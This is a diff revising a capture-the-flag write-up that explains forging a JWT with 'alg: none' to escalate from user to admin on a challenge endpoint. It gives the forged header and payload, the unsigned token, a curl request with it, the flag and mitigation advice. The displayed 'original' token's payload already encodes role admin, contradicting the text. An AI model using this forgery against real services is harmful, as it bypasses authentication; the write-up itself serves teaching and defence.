@@ -1,18 +1,21 @@
 # 🔐 None Shall Pass – JWT alg: none Token Forgery
 
-**Category:** Web Security  
-**Points:** 200  
+**Category:** Web Security\
+**Points:** 200\
 **Solves:** 418
 
 ---
 
 ### 🧠 Challenge Summary
-We were given access to a token-protected intranet application that issues JWTs for authentication. The objective was to bypass the role-based access control protecting the `/secret` endpoint using a low-privilege account and escalate to `admin` by forging a token.
+
+Deep inside Juche Jaguar’s intranet runs a custom token-based gateway protecting their most sensitive files at `/secret`. We got access to a low-privileged user account (`agent:spudpotato`). The challenge was to obtain a token and escalate privileges using a vulnerability in how JWTs were handled.
 
 ---
 
 ### 🎯 Objective
-Exploit the JWT implementation to forge a token with `role: admin` and retrieve the flag from:
+
+Exploit a vulnerable JWT implementation to escalate privileges from `user` to `admin` and access the `/secret` endpoint.
+
 ```
 http://34.85.163.182:8080/secret
 ```
@@ -20,8 +23,9 @@ http://34.85.163.182:8080/secret
 ---
 
 ### 🛠️ Tools & Techniques Used
+
+- [jwt.io](https://jwt.io) (for decoding and inspecting JWTs)
 - Web browser (initial login)
-- JWT token decoder (jwt.io)
 - Manual Base64 crafting
 - `curl` for HTTP request
 - Token manipulation (`alg: none` bypass)
@@ -29,70 +33,82 @@ http://34.85.163.182:8080/secret
 ---
 
 ### 🔍 Recon – Analyzing the JWT
+
 After logging in with:
+
 ```
 Username: agent
 Password: spudpotato
 ```
-A JWT was displayed in the UI:
+
+A JWT appeared at the bottom of the login screen:
+
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.<<signature>>
 ```
-Decoded header:
+
+We pasted it into [jwt.io](https://jwt.io) to decode:
+
+#### Header:
+
 ```json
 {
   "alg": "HS256",
   "typ": "JWT"
 }
 ```
-Decoded payload:
+
+#### Payload:
+
 ```json
 {
   "user": "agent",
   "role": "user"
 }
 ```
-The algorithm used (`HS256`) implied HMAC. This presented a possible opportunity for a **JWT `alg: none`** vulnerability.
+
+The use of `HS256` implied HMAC signing and suggested a possible `alg: none` vulnerability.
 
 ---
 
 ### 🧪 Exploitation – `alg: none` Forged JWT
-Many misconfigured libraries accept tokens with `alg: none`, ignoring the signature entirely.
+
+Some misconfigured libraries accept tokens using `alg: none`, skipping signature validation entirely.
 
 #### 1. Forge JWT Header:
+
 ```json
 {
   "alg": "none",
   "typ": "JWT"
 }
 ```
-Base64:
-```
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
-```
+
+→ Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
 
 #### 2. Forge JWT Payload:
+
 ```json
 {
   "user": "agent",
   "role": "admin"
 }
 ```
-Base64:
-```
-eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ
-```
 
-#### 3. Final Token:
+→ Base64: `eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ`
+
+#### 3. Combine:
+
 ```
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.
 ```
-(Note the token ends with a period to indicate no signature.)
+
+(Note: ends with a period to represent no signature)
 
 ---
 
 ### 🚀 Final Exploit Request
-Sent request with forged token:
+
 ```bash
 curl http://34.85.163.182:8080/secret \
   -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ."
@@ -101,6 +117,7 @@ curl http://34.85.163.182:8080/secret \
 ---
 
 ### 🏁 Flag
+
 ```
 C1{n0n3_4lg0_byp4ss}
 ```
@@ -108,9 +125,10 @@ C1{n0n3_4lg0_byp4ss}
 ---
 
 ### 🔒 Mitigation
-- Enforce strict server-side checks for the `alg` field — only accept expected algorithms.
-- Do not allow `alg: none` unless explicitly required (which is almost never the case).
-- Use secure and up-to-date JWT libraries that prevent this misconfiguration.
+
+- Reject tokens with `alg: none`
+- Always validate the JWT algorithm against a whitelist (e.g., `HS256`, `RS256`)
+- Use maintained JWT libraries with secure defaults
 
 ---
 
